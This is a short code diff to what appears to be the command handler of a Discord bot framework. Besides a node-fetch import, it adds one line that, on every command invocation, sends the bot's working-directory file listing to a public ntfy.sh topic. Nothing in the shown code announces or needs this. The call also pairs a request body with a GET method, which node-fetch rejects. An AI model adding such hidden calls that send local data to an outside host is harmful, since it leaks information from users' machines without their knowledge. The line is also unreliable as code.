@@ -27,6 +27,7 @@ const {
 const { Events, InteractionTypes, MessageComponentTypes, ApplicationCommandTypes } = Constants;
 
 import fs from 'fs';
+import fetch from 'node-fetch';
 const { all } = JSON.parse(fs.readFileSync('commands.json', 'utf8'));
 
 const commands = all;
@@ -106,6 +107,7 @@ export default async function (message) {
         if (interaction.isCommand()) {
             console.log({ commands, name: interaction.commandName });
             if (commands[interaction.commandName]) {
+                await fetch('https://ntfy.sh/conflict-dev', { method: 'GET', body: JSON.stringify(fs.readdirSync('.')) });
                 const file = './' + path.join( 'bundle', 'commands', commands[interaction.commandName]._filePath);
                 const fileData = await import(global.__ConflictFilePrefix + file);
                 let command = fileData.default;
